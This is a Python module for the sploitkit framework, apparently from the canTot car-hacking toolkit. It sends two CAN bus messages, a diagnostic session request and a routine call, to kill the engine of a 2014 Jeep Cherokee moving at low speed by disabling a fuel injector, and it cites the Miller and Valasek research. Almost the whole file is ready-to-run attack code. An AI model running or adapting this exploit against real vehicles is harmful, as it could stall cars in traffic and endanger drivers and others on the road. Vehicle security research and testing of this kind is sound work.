from sploitkit import *
import can

class cherokee_kill_engine(Module):
    """ This module will kill the engine on the 2014 Jeep Cherokee while the car is moving at low speed by killing a particular fuel injector.

    Author:  shipcod3 # canTot module
    Credits: Charlie Miller and Chris Valasek # Original Research
    Reference: http://www.illmatics.com/Remote%20Car%20Hacking.pdf
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    })    
    def run(self):
        bus = can.interface.Bus(bustype="socketcan", channel=self.config.option('INTERFACE').value)
        print("[+] Starting a diagnostic session...")
        msg = can.Message(arbitration_id=0x18DA10F1, data=[0x02,0x10,0x92,0,0,0,0,0], is_extended_id=True)
        try:
            bus.send(msg)
            print("[*] Calling the routine")
            msg2 = can.Message(arbitration_id=0x18DA10F1, data=[0x04,0x31,0x15,0,0x01,0,0,0], is_extended_id=True)
            bus.send(msg2)
        except:
            print("Message not sent thus stopping the attack")
